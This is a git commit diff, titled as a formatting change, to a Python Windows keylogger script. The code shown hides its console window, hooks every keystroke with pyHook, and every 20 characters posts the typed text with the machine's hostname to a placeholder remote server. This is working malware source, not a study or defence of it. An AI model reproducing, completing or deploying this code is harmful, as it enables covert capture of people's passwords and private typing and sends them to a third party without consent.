eb9d27d4af17e409b36105e351406dfcb649358e
Sreenath Sivadas <sreenathsdas@gmail.com>
2017-11-19 05:51:26 +0530

    changed some formatting

--- keylogger.py
+++ keylogger.py
@@ -8,7 +8,7 @@ import win32gui
 
 
 # Get the console windows and hiding it
-# so that app runs in the background
+# so the app runs in the background
 win=win32console.GetConsoleWindow()
 win32gui.ShowWindow(win,0)
 
@@ -17,16 +17,17 @@ flag = 0
 wbuffer = ''
 hostname = platform.node()
 
+#creating a payload and sending it to the server
 def postRequest(param):
   global hostname
   payload = {'word' : param, 'hostname' : hostname}
-  r = requests.post('http://your_server_name.com/httplib/post/logger.php',data=payload)
+  r = requests.post('http://your_server_name/logger/post.php',data=payload)
 
 def OnKeyboardEvent(event):
   global flag
   global wbuffer
   
-  # logging is is stopped while pressing `` ( 2 times )
+  # logging is is stopped when back quote (`) is pressed twice
   if event.Ascii == 96 :
     flag += 1
     if flag > 1:
@@ -36,15 +37,13 @@ def OnKeyboardEvent(event):
       sys.exit() 
   if event.Ascii != 0 or 8: 
     key = chr(event.Ascii)
-
-    #creating a payload and sending it to localhost
     wbuffer += key
-
+    
+    #Logs the data once the user has pressed 20 characters
     if len(wbuffer) == 20:
       postRequest(wbuffer)
       wbuffer = ''
       
-
 #creating a hook object
 hm = pyHook.HookManager()
 
